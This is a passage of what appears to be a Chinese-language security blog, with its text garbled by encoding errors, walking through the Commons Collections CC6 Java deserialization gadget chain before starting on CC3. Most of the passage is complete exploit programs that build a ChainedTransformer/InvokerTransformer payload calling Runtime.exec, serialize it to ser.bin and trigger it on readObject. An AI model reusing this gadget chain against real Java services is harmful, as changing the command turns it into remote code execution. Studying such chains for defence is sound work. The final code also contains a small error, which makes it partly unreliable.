tiedMapEntry.getValue();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´ç™½äº†è¿˜æ˜¯å»è°ƒ<code>LazyMap.get(&quot;å‰å‰å‰&quot;)</code>ï¼Œåˆ©ç”¨ä¸‹é¢è¿™ä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> tiedMapEntry.getValue();<br><span class="hljs-comment">//getValueæ–¹æ³•ï¼š</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br><span class="hljs-comment">//è¿™é‡Œmapæ˜¯æ„é€ å‡½æ•°é‡Œçš„Lazymapï¼Œè€Œä¸”è¿™ä¸œè¥¿æ˜¯ä¸ªpublicä¿®é¥°çš„ï¼Œç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡è°ƒç”¨å°±è¡Œ</span><br></code></pre></td></tr></table></figure><p>å†å¾€ä¸Šæ‰¾è°è°ƒç”¨äº†è¿™ä¸ª<code>getValue()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br></code></pre></td></tr></table></figure><p>è°è°ƒç”¨äº†<code>hashcode()</code>è¿™ä¸ªæ–¹æ³•ï¼Ÿ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">xxx.readObject<span class="hljs-comment">()</span><br>HashMap.put<span class="hljs-comment">()</span> --è‡ªåŠ¨è°ƒç”¨--&gt;   HashMap.hash<span class="hljs-comment">()</span><br>åç»­åˆ©ç”¨é“¾.hashCode<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><p>ä» <code>HashMap.put</code> å¼€å§‹ï¼Œåˆ° <code>InvokerTransformer</code> ç»“å°¾çš„å¼¹è®¡ç®—å™¨çš„ EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ç”¨ HashMap çš„ hash æ–¹æ³•å®Œæˆé“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMapEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HashMap</code> ç±»çš„ <code>put()</code> æ–¹æ³•è‡ªåŠ¨è°ƒç”¨äº† <code>hash</code> æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨<code>hashicode</code>æ–¹æ³•:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br><span class="hljs-comment">//TiedMapEntryä¸‹çš„hashcodeæ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>        (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ï¼šåœ¨EXPè¿™é‡Œæ‰“æ–­ç‚¹ï¼š</p><p><img src="/img/CC601.png" alt="CC601"></p><p><code>Debug</code>çš„æ—¶å€™å°±èƒ½ç›´æ¥å¼¹è®¡ç®—å™¨äº†</p><p>è¿™é‡Œç”šè‡³éƒ½æ²¡æœ‰è¿›è¡Œputæ“ä½œï¼Œå› ä¸ºï¼š</p><p>å› ä¸ºåœ¨ IDEA è¿›è¡Œ debug è°ƒè¯•çš„æ—¶å€™ï¼Œä¸ºäº†å±•ç¤ºå¯¹è±¡çš„é›†åˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ <code>toString()</code> æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åˆ›å»º <code>TiedMapEntry</code> çš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨è°ƒç”¨äº† <code>getValue()</code> æœ€ç»ˆå°†é“¾å­èµ°å®Œï¼Œç„¶åå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><a href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">å‚è€ƒæ–‡ç« </a></p><p>ç›®å‰å†™å‡ºçš„CC6é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// ç”¨ HashMap çš„ hash æ–¹æ³•å®Œæˆé“¾å­  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC603</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        serialize(expMap);<br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ—¶è¿è¡Œåºåˆ—åŒ–å°±ä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p>å…¶å®å°±æ˜¯hashmapé‡Œé‚£ä¸ªputæ–¹æ³•çš„é”…ï¼šå¯ä»¥çœ‹åˆ°åœ¨putçš„æ—¶å€™å°±å·²ç»è§¦å‘hashæ–¹æ³•äº†ï¼Œè€Œä¸æ˜¯ç­‰åˆ°readobjectçš„æ—¶å€™è§¦å‘hashæ–¹æ³•</p><p>å…¶å®è¿™é‡Œå’ŒURLDNSé‚£æ¡é“¾å­ä¸€æ ·ï¼šæˆ‘ä»¬å¸Œæœ›æ˜¯ç”±<code>readObject</code>æ–¹æ³•è§¦å‘<code>hash</code>ç„¶åè§¦å‘<code>hashcode</code>ï¼Œä½†å‰é¢ä¹Ÿè¯´äº†ï¼š<code>put</code>çš„æ—¶å€™ä¹Ÿä¼šèµ°åˆ°<code>hash</code>é‚£è¾¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Hashmap</span><br>    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹çš„ç›®çš„ï¼Ÿè®©putæ–¹æ³•çš„æ—¶å€™æ— æ³•è§¦å‘è¿™æ¡é“¾å­ï¼Œæ¯”å¦‚æˆ‘åœ¨putå‰å…ˆæŠŠè¿™æ¡é“¾å­é‡ŒæŸäº›ä¸œè¥¿æ”¹æˆé”™è¯¯çš„ï¼Œputå®Œä¹‹åä¿®æ”¹æˆæ­£ç¡®çš„ï¼Œè®©å®ƒç­‰åˆ°ååºåˆ—åŒ–çš„readobjectæ—¶å†è§¦å‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br><br>-----------------&gt; å˜æˆ<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>));<br><br><br><span class="hljs-comment">//åœ¨æ‰§è¡Œ put æ–¹æ³•ä¹‹åé€šè¿‡åå°„ä¿®æ”¹ Transformer çš„ factory å€¼</span><br><br><br>Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br>factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>factoryField.set(lazyMapClass, chainedTransformer);<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ—¶å‘ç°ååºåˆ—åŒ–è¿˜æ˜¯æ²¡æ³•è§¦å‘è®¡ç®—å™¨ï¼Œé—®é¢˜å‡ºåœ¨Lazymapçš„getæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä»–è¿™ä¸ªä¸œè¥¿ä¼šåœ¨mapä¸­ä¸åŒ…å«keyçš„æ—¶å€™æ‰ä¼šè§¦å‘åé¢é‚£ä¸ªfactory.transform(key)ï¼Œç„¶åä»–ä¼šæŠŠè¿™ä¸ªkeyæ”¾è¿›å»ï¼ï¼é‚£ä¹ˆæˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿™é‡Œå°±å·²ç»æœ‰è¿™ä¸ªkeyäº†ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘factory.transform(key)è¿™ä¸ªæ–¹æ³•ã€‚</p><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œputå®Œå†æŠŠkeyåˆ äº†å°±è¡Œï¼š</p><p>Finalexp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC6 é“¾æœ€ç»ˆ EXPpublic class FinalCC6EXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;five&quot;</span>)); <span class="hljs-comment">// é˜²æ­¢åœ¨ååºåˆ—åŒ–å‰å¼¹è®¡ç®—å™¨  </span><br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> expMap.put(tiedMapEntry, <span class="hljs-string">&quot;value&quot;</span>);  <br> lazymap.remove(<span class="hljs-string">&quot;key&quot;</span>);<br>  <br> <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);  <br> factoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> factoryField.set(lazyMapClass, chainedTransformer);  <br>  <br> serialize(expMap);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>å’ŒCC1ä¸CC6è¿™ä¸¤æ¡é“¾æ˜¯ç›´æ¥åœ¨é“¾çš„ä»£ç ä¸­æ‰§è¡Œä»»æ„ä»£ç ç›¸æ¯”ï¼Œ<strong>CC3æ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ¥å®ç°è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»çš„ä»£ç çš„</strong>ã€‚</p><p>å›é¡¾ä¸€ä¸‹(å¿˜å·®ä¸å¤šäº†)ï¼š</p><p>å®ä¾‹åŒ–ä¹‹å‰ï¼Œå¿…é¡»å…ˆåŠ è½½ç±»çš„å­—èŠ‚ç æ–‡ä»¶åˆ°å†…å­˜ä¸­ã€‚<code>java</code>ç±»åŠ 